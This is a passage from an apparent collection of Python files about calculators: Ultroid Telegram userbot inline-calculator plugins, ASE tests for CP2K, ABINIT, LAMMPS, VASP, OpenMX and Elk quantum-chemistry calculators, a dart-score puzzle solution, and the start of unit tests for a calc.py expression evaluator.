\"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "9": "\"\"\"Tests for the CP2K ASE calulator.\n\nhttp://www.cp2k.org\nAuthor: Ole Schuett \n\"\"\"\n\nfrom ase.build import molecule\nfrom ase.optimize import BFGS\nimport pytest\nfrom ase.calculators.calculator import CalculatorSetupError\nfrom ase import units\nfrom ase.atoms import Atoms\nfrom ase.md.velocitydistribution import MaxwellBoltzmannDistribution\nfrom ase.md.verlet import VelocityVerlet\n\n\n@pytest.fixture\ndef atoms():\n    return molecule('H2', vacuum=2.0)\n\n\ndef test_geoopt(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(label='test_H2_GOPT', print_level='LOW')\n    atoms.calc = calc\n\n    with BFGS(atoms, logfile=None) as gopt:\n        gopt.run(fmax=1e-6)\n\n    dist = atoms.get_distance(0, 1)\n    dist_ref = 0.7245595\n    assert (dist - dist_ref) / dist_ref < 1e-7\n\n    energy_ref = -30.7025616943\n    energy = atoms.get_potential_energy()\n    assert (energy - energy_ref) / energy_ref < 1e-10\n\n\ndef test_h2_lda(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(label='test_H2_LDA')\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -30.6989595886\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_h2_libxc(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(\n        xc='XC_GGA_X_PBE XC_GGA_C_PBE',\n        pseudo_potential=\"GTH-PBE\",\n        label='test_H2_libxc')\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -31.591716529642\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_h2_ls(cp2k_factory, atoms):\n    inp = \"\"\"&FORCE_EVAL\n               &DFT\n                 &QS\n                   LS_SCF ON\n                 &END QS\n               &END DFT\n             &END FORCE_EVAL\"\"\"\n    calc = cp2k_factory.calc(label='test_H2_LS', inp=inp)\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -30.6989581747\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 5e-7\n\n\ndef test_h2_pbe(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(xc='PBE', label='test_H2_PBE')\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -31.5917284949\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_md(cp2k_factory):\n    calc = cp2k_factory.calc(label='test_H2_MD')\n    positions = [(0, 0, 0), (0, 0, 0.7245595)]\n    atoms = Atoms('HH', positions=positions, calculator=calc)\n    atoms.center(vacuum=2.0)\n\n    MaxwellBoltzmannDistribution(atoms, temperature_K=0.5 * 300,\n                                 force_temp=True)\n    energy_start = atoms.get_potential_energy() + atoms.get_kinetic_energy()\n    with VelocityVerlet(atoms, 0.5 * units.fs) as dyn:\n        dyn.run(20)\n\n    energy_end = atoms.get_potential_energy() + atoms.get_kinetic_energy()\n    assert abs(energy_start - energy_end) < 1e-4\n\n\ndef test_o2(cp2k_factory):\n    calc = cp2k_factory.calc(\n        label='test_O2', uks=True, cutoff=150 * units.Rydberg,\n        basis_set=\"SZV-MOLOPT-SR-GTH\")\n    o2 = molecule('O2', calculator=calc)\n    o2.center(vacuum=2.0)\n    energy = o2.get_potential_energy()\n    energy_ref = -861.057011375\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_restart(cp2k_factory, atoms):\n    calc = cp2k_factory.calc()\n    atoms.calc = calc\n    atoms.get_potential_energy()\n    calc.write('test_restart')  # write a restart\n    calc2 = cp2k_factory.calc(restart='test_restart')  # load a restart\n    assert not calc2.calculation_required(atoms, ['energy'])\n\n\ndef test_unknown_keywords(cp2k_factory):\n    with pytest.raises(CalculatorSetupError):\n        cp2k_factory.calc(dummy_nonexistent_keyword='hello')\n", "10": "import pytest\nimport numpy as np\nfrom ase.build import bulk, molecule\nfrom ase.units import Hartree\n\n\ncalc = pytest.mark.calculator\n\nrequired_quantities = {'eigenvalues',\n                       'fermilevel',\n                       'version',\n                       'forces',\n                       'energy',\n                       'free_energy',\n                       'stress',\n                       'ibz_kpoints',\n                       'kpoint_weights'}\n\n\ndef run(atoms):\n    atoms.get_forces()\n    print(sorted(atoms.calc.results))\n    for key, value in atoms.calc.results.items():\n        if isinstance(value, np.ndarray):\n            print(key, value.shape, value.dtype)\n        else:\n            print(key, value)\n\n    for name in required_quantities:\n        assert name in atoms.calc.results\n\n    return atoms.calc.results\n\n\n@pytest.mark.calculator_lite\n@calc('abinit')\ndef test_si(factory):\n    atoms = bulk('Si')\n    atoms.calc = factory.calc(nbands=4 * len(atoms), kpts=[4, 4, 4])\n    run(atoms)\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.parametrize('pps', ['fhi', 'paw'])\n@calc('abinit')\ndef test_au(factory, pps):\n    atoms = bulk('Au')\n    atoms.calc = factory.calc(\n        pps=pps,\n        nbands=10 * len(atoms),\n        tsmear=0.1,\n        occopt=3,\n        kpts=[2, 2, 2],\n        pawecutdg=6.0 * Hartree,\n    )\n    # Somewhat awkward to set pawecutdg also when we are not doing paw,\n    # but it's an error to pass None as pawecutdg.\n    run(atoms)\n\n\n@pytest.fixture\ndef fe_atoms():\n    return bulk('Fe')\n\n\ndef getkwargs(**kw):\n    return dict(nbands=8, kpts=[2, 2, 2])\n\n\n@pytest.mark.calculator_lite\n@calc('abinit', occopt=7, **getkwargs())\n@calc('abinit', spinmagntarget=2.3, **getkwargs())\ndef test_fe_magmom(factory, fe_atoms):\n    fe_atoms.calc = factory.calc()\n    run(fe_atoms)\n\n\n@calc('abinit', nbands=8)\ndef test_h2o(factory):\n    atoms = molecule('H2O', vacuum=2.5)\n    atoms.calc = factory.calc()\n    run(atoms)\n\n\n@calc('abinit', nbands=8, occopt=7)\ndef test_o2(factory):\n    atoms = molecule('O2', vacuum=2.5)\n    atoms.calc = factory.calc()\n    run(atoms)\n    magmom = atoms.get_magnetic_moment()\n    assert magmom == pytest.approx(2, 1e-2)\n    print('magmom', magmom)\n\n\n@pytest.mark.skip('expensive')\n@calc('abinit')\ndef test_manykpts(factory):\n    atoms = bulk('Au') * (2, 2, 2)\n    atoms.rattle(stdev=0.01)\n    atoms.symbols[:2] = 'Cu'\n    atoms.calc = factory.calc(nbands=len(atoms) * 7, kpts=[8, 8, 8])\n    run(atoms, 'manykpts')\n\n\n@pytest.mark.skip('expensive')\n@calc('abinit')\ndef test_manyatoms(factory):\n    atoms = bulk('Ne', cubic=True) * (4, 2, 2)\n    atoms.rattle(stdev=0.01)\n    atoms.calc = factory.calc(nbands=len(atoms) * 5)\n    run(atoms, 'manyatoms')\n", "11": "import pytest\nimport numpy as np\nfrom ase import Atom\nfrom ase.build import bulk\nimport ase.io\nfrom ase import units\nfrom ase.md.verlet import VelocityVerlet\n\n\n@pytest.fixture\ndef Atoms_fcc_Ni_with_H_at_center():\n    atoms = bulk(\"Ni\", cubic=True)\n    atoms += Atom(\"H\", position=atoms.cell.diagonal() / 2)\n    return atoms\n\n\n@pytest.fixture\ndef lammps_data_file_Fe(datadir):\n    return datadir / \"lammpslib_simple_input.data\"\n\n\n@pytest.fixture\ndef calc_params_Fe(lammps_data_file_Fe):\n    calc_params = {}\n    calc_params[\"lammps_header\"] = [\n        \"units           real\",\n        \"atom_style      full\",\n        \"boundary        p p p\",\n        \"box tilt        large\",\n        \"pair_style      lj/cut/coul/long 12.500\",\n        \"bond_style      harmonic\",\n        \"angle_style     harmonic\",\n        \"kspace_style    ewald 0.0001\",\n        \"kspace_modify   gewald 0.01\",\n        f\"read_data      {lammps_data_file_Fe}\",\n    ]\n    calc_params[\"lmpcmds\"] = []\n    calc_params[\"atom_types\"] = {\"Fe\": 1}\n    calc_params[\"create_atoms\"] = False\n    calc_params[\"create_box\"] = False\n    calc_params[\"boundary\"] = False\n    calc_params[\"log_file\"] = \"test.log\"\n    calc_params[\"keep_alive\"] = True\n    return calc_params\n\n\n@pytest.fixture\ndef Atoms_Fe(lammps_data_file_Fe):\n    Atoms_Fe = ase.io.read(\n        lammps_data_file_Fe,\n        format=\"lammps-data\",\n        Z_of_type={1: 26},\n        units=\"real\",\n    )\n    return Atoms_Fe\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.calculator(\"lammpslib\")\ndef test_lammpslib_simple(\n    factory,\n    calc_params_NiH,\n    Atoms_fcc_Ni_with_H_at_center,\n    calc_params_Fe,\n    Atoms_Fe,\n):\n    \"\"\"\n    Get energy from a LAMMPS calculation of an uncharged system.\n    This was written to run with the 30 Apr 2019 version of LAMMPS,\n    for which uncharged systems require the use of 'kspace_modify gewald'.\n    \"\"\"\n    NiH = Atoms_fcc_Ni_with_H_at_center\n\n    # Add a bit of distortion to the cell\n    NiH.set_cell(\n        NiH.cell + [[0.1, 0.2, 0.4], [0.3, 0.2, 0.0], [0.1, 0.1, 0.1]],\n        scale_atoms=True,\n    )\n\n    calc = factory.calc(**calc_params_NiH)\n    NiH.calc = calc\n\n    E = NiH.get_potential_energy()\n    F = NiH.get_forces()\n    S = NiH.get_stress()\n\n    print(\"Energy: \", E)\n    print(\"Forces:\", F)\n    print(\"Stress: \", S)\n    print()\n\n    E = NiH.get_potential_energy()\n    F = NiH.get_forces()\n    S = NiH.get_stress()\n\n    calc = factory.calc(**calc_params_NiH)\n    NiH.calc = calc\n\n    E2 = NiH.get_potential_energy()\n    F2 = NiH.get_forces()\n    S2 = NiH.get_stress()\n\n    assert E == pytest.approx(E2, rel=1e-4)\n    assert F == pytest.approx(F2, rel=1e-4)\n    assert S == pytest.approx(S2, rel=1e-4)\n\n    NiH.rattle(stdev=0.2)\n    E3 = NiH.get_potential_energy()\n    F3 = NiH.get_forces()\n    S3 = NiH.get_stress()\n\n    print(\"rattled atoms\")\n    print(\"Energy: \", E3)\n    print(\"Forces:\", F3)\n    print(\"Stress: \", S3)\n    print()\n\n    assert not np.allclose(E, E3)\n    assert not np.allclose(F, F3)\n    assert not np.allclose(S, S3)\n\n    # Add another H\n    NiH += Atom(\"H\", position=NiH.cell.diagonal() / 4)\n    E4 = NiH.get_potential_energy()\n    F4 = NiH.get_forces()\n    S4 = NiH.get_stress()\n\n    assert not np.allclose(E4, E3)\n    assert not np.allclose(F4[:-1, :], F3)\n    assert not np.allclose(S4, S3)\n\n    # the example from the docstring\n\n    NiH = Atoms_fcc_Ni_with_H_at_center\n    calc = factory.calc(**calc_params_NiH)\n    NiH.calc = calc\n    print(\"Energy \", NiH.get_potential_energy())\n\n    # a more complicated example, reading in a LAMMPS data file\n    calc = factory.calc(**calc_params_Fe)\n    Atoms_Fe.calc = calc\n    with VelocityVerlet(Atoms_Fe, 1 * units.fs) as dyn:\n        energy = Atoms_Fe.get_potential_energy()\n        assert energy == pytest.approx(2041.411982950972, rel=1e-4)\n\n        dyn.run(10)\n        energy = Atoms_Fe.get_potential_energy()\n        assert energy == pytest.approx(312.4315854721744, rel=1e-4)\n", "12": "def solution(dartResult):\n    calc = ''\n    for i in dartResult:\n        if i == 'S':\n            calc += '^1'\n        elif i == 'D':\n            calc += '^2'\n        elif i == 'T':\n            calc += '^3'\n        elif i == '#':\n            calc += '*(-1)'\n            calc = calc.replace('+*','*')\n        elif i == '*':\n            temp = []\n            for i in range(len(calc)):\n                if calc[i] == '+':\n                    temp.append(i)\n            if(temp == []):\n                calc += '*2+'\n            elif(len(temp) == 1):\n                calc += '*2+'\n            temp = sorted(temp, reverse=True)[0:2]\n            for i in temp:\n                print(temp)\n                restText = calc[i:]\n                calc = calc[0:i] + '*2' + restText\n        else :\n            calc += i\n        if i is not dartResult[-1] and (i =='S' or i == 'D' or i =='T' or i == '#'):\n                calc += '+'\n    calc = calc.rstrip('+').replace('^','**')\n    return eval(calc)\n\ndef best_solution(dartResult):\n    score = []\n    n = ''\n    for i in dartResult:\n        if i.isnumeric():\n            n += i\n        elif i == 'S':\n            score.append(int(n) ** 1)\n            n = ''\n        elif i == 'D':\n            score.append(int(n) ** 2)\n            n = ''\n        elif i == 'T':\n            score.append(int(n) ** 3)\n            n = ''\n        elif i == '*':\n            if len(score) > 1:\n                score[-2] *= 2\n            score[-1] *= 2\n        elif i == '#':\n            score[-1] *= -1\n    return sum(score)\n    \ntestDart = '1S2D*3T'\ntestDart2 = '1D2S#10S'\ntestDart3 = '1D2S0T'\ntestDart4 = '1S*2T*3S'\ntestDart5 = '1D#2S*3S'\ntestDart6 = '1T2D3D#'\ntestDart7 = '1D2S3T*'\nprint(solution(testDart7))\nprint(best_solution(testDart7))\n", "13": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"Cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "14": "import pytest\nfrom ase.build import molecule\nfrom ase.test.factories import ObsoleteFactoryWrapper\n\n\n@pytest.mark.parametrize('name', ['gamess_us', 'gaussian'])\ndef test_h2dft_old(name):\n    factory = ObsoleteFactoryWrapper(name)\n    run(factory)\n\n\ncalc = pytest.mark.calculator\n\n\n# @calc('abinit', ecut=200, toldfe=0.0001)\n# Doesn't work with abinit9.\n# We should replace the restart stuff anyway.\n@calc('cp2k', auto_write=True, uks=True)\n# @calc('gpaw', mode='lcao', basis='sz(dzp)')\ndef test_h2dft(factory):\n    run(factory)\n\n\ndef run(factory):\n    name = factory.name\n    calc = factory.calc(label=name, xc='LDA')\n    h2 = molecule('H2', calculator=calc)\n    h2.center(vacuum=2.0)\n    e2 = h2.get_potential_energy()\n    calc.set(xc='PBE')\n    e2pbe = h2.get_potential_energy()\n    h1 = h2.copy()\n    del h1[1]\n    h1.set_initial_magnetic_moments([1])\n    h1.calc = calc\n    e1pbe = h1.get_potential_energy()\n    calc.set(xc='LDA')\n    e1 = h1.get_potential_energy()\n    try:\n        m1 = h1.get_magnetic_moment()\n    except NotImplementedError:\n        pass\n    else:\n        print(m1)\n    print(2 * e1 - e2)\n    print(2 * e1pbe - e2pbe)\n    print(e1, e2, e1pbe, e2pbe)\n    calc = factory.calc(restart=name)\n    print(calc.parameters, calc.results, calc.atoms)\n    assert not calc.calculation_required(h1, ['energy'])\n    h1 = calc.get_atoms()\n    print(h1.get_potential_energy())\n    label = 'dir/' + name + '-h1'\n    calc = factory.calc(label=label, atoms=h1, xc='LDA')\n    print(h1.get_potential_energy())\n", "15": "import pytest\nfrom ase.build import bulk\n\ncalc = pytest.mark.calculator\n\n\n@pytest.fixture\ndef system():\n    return bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\n@calc('vasp')\ndef test_vasp_net_charge(factory, system):\n    \"\"\"Run VASP tests to ensure that determining number of electrons from\n    user-supplied net charge (via the deprecated net_charge parameter) works\n    correctly. This is conditional on the existence of the VASP_COMMAND or\n    VASP_SCRIPT environment variables.\n\n    This is mainly a slightly reduced duplicate of the vasp_charge\n    test, but with flipped signs and with checks that ensure\n    FutureWarning is emitted.\n\n    Should be removed along with the net_charge parameter itself at\n    some point.\"\"\"\n\n    # Dummy calculation to let VASP determine default number of electrons\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False)\n    calc.calculate(system)\n    default_nelect_from_vasp = calc.get_number_of_electrons()\n    assert default_nelect_from_vasp == 12\n\n    # Compare VASP's output nelect from before + net charge to default nelect\n    # determined by us + net charge\n    with pytest.warns(FutureWarning):\n        net_charge = -2\n        calc = factory.calc(xc='LDA',\n                            nsw=-1,\n                            ibrion=-1,\n                            nelm=1,\n                            lwave=False,\n                            lcharg=False,\n                            net_charge=net_charge)\n        calc.initialize(system)\n        calc.write_input(system)\n        calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] == default_nelect_from_vasp + net_charge\n\n    # Test that conflicts between explicitly given nelect and net charge are\n    # detected\n    with pytest.raises(ValueError):\n        with pytest.warns(FutureWarning):\n            calc = factory.calc(xc='LDA',\n                                nsw=-1,\n                                ibrion=-1,\n                                nelm=1,\n                                lwave=False,\n                                lcharg=False,\n                                nelect=default_nelect_from_vasp + net_charge +\n                                1,\n                                net_charge=net_charge)\n            calc.calculate(system)\n\n    # Test that conflicts between charge and net_charge are detected\n    with pytest.raises(ValueError):\n        with pytest.warns(FutureWarning):\n            calc = factory.calc(xc='LDA',\n                                nsw=-1,\n                                ibrion=-1,\n                                nelm=1,\n                                lwave=False,\n                                lcharg=False,\n                                charge=-net_charge - 1,\n                                net_charge=net_charge)\n            calc.calculate(system)\n\n    # Test that nothing is written if net charge is 0 and nelect not given\n    with pytest.warns(FutureWarning):\n        calc = factory.calc(xc='LDA',\n                            nsw=-1,\n                            ibrion=-1,\n                            nelm=1,\n                            lwave=False,\n                            lcharg=False,\n                            net_charge=0)\n        calc.initialize(system)\n        calc.write_input(system)\n        calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] is None\n", "16": "import pytest\nfrom ase.build import bulk\n\n\nomx_par = {'definition_of_atomic_species': [['Al', 'Al8.0-p1', 'Al_CA13'],\n                                            ['O', 'O6.0-p1', 'O_CA13']]}\n\n\ncalc = pytest.mark.calculator\n\n\n@calc('openmx', **omx_par)\n@calc('elk', rgkmax=5.0)\ndef test_al(factory):\n    name = factory.name\n    # What on earth does kpts=1.0 mean?  Was failing, I changed it.  --askhl\n    # Disabled GPAW since it was failing anyway. --askhl\n    kpts = [2, 2, 2]\n    calc = factory.calc(label=name, xc='LDA', kpts=kpts)\n    al = bulk('AlO', crystalstructure='rocksalt', a=4.5)\n    al.calc = calc\n    e = al.get_potential_energy()\n    calc.set(xc='PBE', kpts=kpts)\n    epbe = al.get_potential_energy()\n    print(e, epbe)\n    calc = factory.calc(restart=name)\n    print(calc.parameters, calc.results, calc.atoms)\n    assert not calc.calculation_required(al, ['energy'])\n    al = calc.get_atoms()\n    print(al.get_potential_energy())\n    label = 'dir/' + name + '-2'\n    calc = factory.calc(label=label, atoms=al, xc='LDA', kpts=kpts)\n    print(al.get_potential_energy())\n", "17": "\"\"\"\nUnit tests for calc.py\n\"\"\"\n\nimport unittest\nimport numpy\nimport calc\nfrom pyparsing import ParseException\n\n# numpy's default behavior when it evaluates a function outside its domain\n# is to raise a warning (not an exception) which is then printed to STDOUT.\n# To prevent this from polluting the output of the tests, configure numpy to\n# ignore it instead.\n# See http://docs.scipy.org/doc/numpy/reference/generated/numpy.seterr.html\nnumpy.seterr(all='ignore')  # Also: 'ignore', 'warn' (default), 'raise'\n\nclass EvaluatorTest(unittest.TestCase):\n    \"\"\"\n    Run tests for calc.evaluator\n    Go through all functionalities as specifically as possible--\n    work from number input to functions and complex expressions\n    Also test custom variable substitutions (i.e.\n      `evaluator({'x':3.0}, {}, '3*x')`\n    gives 9.0) and more.\n    \"\"\"\n\n    def test_number_input(self):\n        \"\"\"\n        Test different kinds of float inputs\n\n        See also\n          test_trailing_period (slightly different)\n          test_exponential_answer\n          test_si_suffix\n        \"\"\"\n        easy_eval = lambda x: calc.evaluator({}, {}, x)\n\n        self.assertEqual(easy_eval(\"13\"), 13)\n        self.assertEqual(easy_eval(\"3.14\"), 3.14)\n        self.assertEqual(easy_eval(\".618033989\"), 0.618033989)\n\n        self.assertEqual(easy_eval(\"-13\"), -13)\n        self.assertEqual(easy_eval(\"-3.14\"), -3.14)\n        self.assertEqual(easy_eval(\"-.618033989\"), -0.618033989)\n\n    def test_period(self):\n        \"\"\"\n        The string '.' should not evaluate to anything.\n        \"\"\"\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '.')\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '1+.')\n\n    def test_trailing_period(self):\n        \"\"\"\n        Test that things like '4.' will be 4 and not throw an error\n        \"\"\"\n        self.assertEqual(4.0, calc.evaluator({}, {}, '4.'))\n\n    def test_exponential_answer(self):\n        \"\"\"\n        Test for correct interpretation of scientific notation\n        \"\"\"\n        answer = 50\n        correct_responses = [\n            \"50\", \"50.0\", \"5e1\", \"5e+1\",\n            \"50e0\", \"50.0e0\", \"500e-1\"\n        ]\n        incorrect_responses = [\"\", \"3.9\", \"4.1\", \"0\", \"5.01e1\"]\n\n        for input_str in correct_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to equal {1}\".format(\n                input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n        for input_str in incorrect_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to not equal {1}\".format(\n                input_str, answer\n            )\n            self.assertNotEqual(answer, result, msg=fail_msg)\n\n    def test_si_suffix(self):\n        \"\"\"\n        Test calc.py's unique functionality of interpreting si 'suffixes'.\n\n        For instance 'k' stand for 'kilo-' so '1k' should be 1,000\n        \"\"\"\n        test_mapping = [\n            ('4.2%', 0.042), ('2.25k', 2250), ('8.3M', 8300000),\n            ('9.9G', 9.9e9), ('1.2T', 1.2e12), ('7.4c', 0.074),\n            ('5.4m', 0.0054), ('8.7u', 0.0000087),\n            ('5.6n', 5.6e-9), ('4.2p', 4.2e-12)\n        ]\n\n        for (expr, answer) in test_mapping:\n            tolerance = answer * 1e-6  # Make rel. tolerance, because of floats\n            fail_msg = \"Failure in testing suffix '{0}': '{1}' was not {2}\"\n            fail_msg = fail_msg.format(expr[-1], expr, answer)\n            self.assertAlmostEqual(\n                calc.evaluator({}, {}, expr), answer,\n                delta=tolerance, msg=fail_msg\n            )\n\n    def test_operator_sanity(self):\n        \"\"\"\n        Test for simple things like '5+2' and '5/2'\n        \"\"\"\n        var1 = 5.0\n        var2 = 2.0\n        operators = [('+', 7), ('-', 3), ('*', 10), ('/', 2.5), ('^', 25)]\n\n        for (operator, answer) in operators:\n            input_str = \"{0} {1} {2}\".format(var1, operator, var2)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on operator '{0}': '{1}' was not {2}\".format(\n                operator, input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n    def test_raises_zero_division_err(self):\n        \"\"\"\n        Ensure division by zero gives an error\n        \"\"\"\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0.0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({'x': 0.0}, {}, '1/x')\n\n    def test_parallel_resistors(self):\n        \"\"\"\n        Test the parallel resistor operator ||\n\n        The formula is given by\n            a || b || c ...\n            = 1 / (1/a + 1/b + 1/c + ...)\n        It is the resistance of a parallel circuit of resistors with resistance\n        a, b, c, etc&. See if this evaulates correctly.\n        \"\"\"\n        self.assertEqual(calc.evaluator({}, {}, '1||1'), 0.5)\n        self.assertEqual(calc.evaluator({}, {}, '1||1||2'), 0.4)\n        self.assertEqual(calc.evaluator({}, {}, \"j||1\"), 0.5 + 0.5j)\n\n    def test_parallel_resistors_with_zero(self):\n        \"\"\"\n        Check the behavior of the || operator with 0\n        \"\"\"\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0.0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({'x': 0.0}, {}, 'x||1')))\n\n    def 